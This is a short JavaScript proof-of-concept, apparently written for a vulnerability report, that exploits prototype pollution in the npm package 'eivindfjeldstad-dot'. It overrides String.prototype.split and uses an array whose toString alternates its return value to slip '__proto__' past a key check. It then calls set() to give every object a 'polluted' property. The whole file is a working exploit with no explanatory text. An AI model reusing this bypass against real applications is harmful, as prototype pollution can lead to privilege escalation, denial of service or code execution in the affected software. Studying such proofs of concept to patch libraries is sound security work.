var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const a = require('eivindfjeldstad-dot');
console.log({}.polluted);
let path = '__proto__.polluted';
a.set({}, path, 'yes');
console.log({}.polluted);